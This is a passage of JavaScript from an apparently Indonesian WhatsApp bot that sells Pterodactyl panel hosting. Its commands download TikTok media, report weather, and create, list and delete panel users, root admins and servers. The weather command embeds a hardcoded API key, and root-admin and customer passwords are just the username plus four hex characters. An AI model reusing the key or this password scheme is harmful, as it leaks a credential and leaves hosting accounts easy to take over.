    let teks = `📋 *Daftar Produk Saat Ini:*\n\n${global.listProduk.map((p, i) => `${i+1}. ${p}`).join("\n")}`
    
    // Kirim pakai fquoted
    await conn.sendMessage(m.chat, { text: teks }, { quoted: qtext })
}
break
case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `Terimakasih Sudah Berbelanja`, 
thumbnailUrl: global.image.ReplyStore, 
sourceUrl: linkSaluran,
}}}, {quoted: qtext})
}
break
case "prosses":
case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `Bentar ya Lagi dirposes`, 
thumbnailUrl: global.image.ReplyStore, 
sourceUrl: linkSaluran,
}}}, {quoted: m})
}
break
case 'tiktok':
case 'tt': {

    // tanpa link
    if (!args[0]) {
        return Reply(
          'Mana link TikTok-nya? 🤨\n\n' +
          'Contoh:\n.tiktok https://vt.tiktok.com/xxxx'
        )
    }

    // ada link
    await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key }})
    await Reply('Tunggu sebentar ya lagi proses...')

    let res = await tiktok2(args[0])

    // VIDEO → ditambah caption (AMAN)
    await conn.sendMessage(m.chat, {
        video: { url: res.no_watermark },
        fileName: 'tiktok.mp4',
        mimetype: 'video/mp4',
        caption: `🎬 TikTok Downloader\n\n✅ No Watermark \n\n✅ HD Quality\n\n> \`ᴄʀᴇᴀᴛᴇᴅ ʙʏ: 𝐤𝐞𝐥𝐩𝐢𝐧\` `
    }, { quoted: m })

    // AUDIO → PERSIS KAYAK AWAL (TIDAK DIUBAH)
    conn.sendMessage(m.chat, {
        audio: { url: res.music },
        fileName: 'tiktok.mp3',
        mimetype: 'audio/mp4'
    })

}
break
case 'cuaca': case 'cekcuaca': {
				if (!text) return Reply(`Example: ${prefix + command} jakarta`)
				try {
					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
					Reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
				} catch (e) {
					Reply('Kota Tidak Di Temukan!')
				}
			}
			break
case "ttmp3": case "tiktokmp3": {
    try {
        if (!text) return Reply(`*Contoh: ${usedPrefix + command} https://vt.tiktok.com/...*`);

        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        let res = await fetch('https://ttsave.app/download', {
            method: 'POST',
            headers: {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify({
                query: text,
                language_id: '2'
            })
        });

        let html = await res.text();

        let regex = /href="(https:\/\/v16-ies-music\.tiktokcdn\.com\/[^"]+)"/g;
        let audioUrl;
        let match;

        while ((match = regex.exec(html)) !== null) {
            if (match[1].includes('mime_type=audio')) {
                audioUrl = match[1];
                break;
            }
        }

        if (!audioUrl) {
            return Reply('🍂 *Audio TikTok tidak ditemukan*');
        }

        await conn.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg'
            },
            { quoted: m }
        );

    } catch (e) {
        await Reply(`🍂 *Terjadi kesalahan*\n${e.message}`);
    } finally {
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
    }
};
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case "public": {

if (!isOwner) return Reply(msg.owner)

conn.public = true

Reply("Berhasil mengganti mode bot menjadi *Public*")

}

break       

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tt2": case "tiktok2": {
if (!text) return Reply(example("url"))
if (!text.startsWith("https://")) return Reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '📥', key: m.key}})
if (!result.status) return Reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*video tiktok berhasil ke download ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*video tiktok berhasil ke download ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tobase64": {
    if (!text) return Reply("Masukan Text!")

    let result = Buffer.from(text).toString('base64')

    Reply(`✅ Hasil Base64:\n\n${result}`)
}
break;
case "tourl": {
if (!/image/.test(mime)) return Reply(example("dengan kirim/Reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'kelpinn.png');

let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*DATA AKUN PANEL ADMIN ANDA 🚚*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

───────────────────────────────
*📡 ID USER (${user.id})* 
*👤 USERNAME :* ${user.username}
*🔐 PASSWORD :* ${password.toString()}
* 🌐 LINK :* ${global.domain}
───────────────────────────────

───────────────────────────────
*RULES & ADP*
• Jangan Open Admin Panel Lagi
• Jangan Open Reseller 
> Jika di Langgar akan di und

*SYARAT & KETENTUAN :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
───────────────────────────────

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*DATA AKUN PANEL ADMIN ANDA 🚚*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

───────────────────────────────
*📡 ID USER (${user.id})* 
*👤 USERNAME :* ${user.username}
*🔐 PASSWORD :* ${password.toString()}
*🌐 LINK :* ${global.domainV2}
───────────────────────────────

───────────────────────────────
*RULES & ADP*
• Jangan Open Admin Panel Lagi
• Jangan Open Reseller 
> Jika di Langgar akan di und

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
───────────────────────────────
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Berhasil menambah reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listseller": {
if (premium.length < 1) return Reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return Reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
Reply(`Berhasil menghapus reseller ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!args[0]) return Reply('Contoh: .5gb-v2 username')
let username = args[0].toLowerCase()
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*?? Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Reply("Server panel tidak ditemukan!")
Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
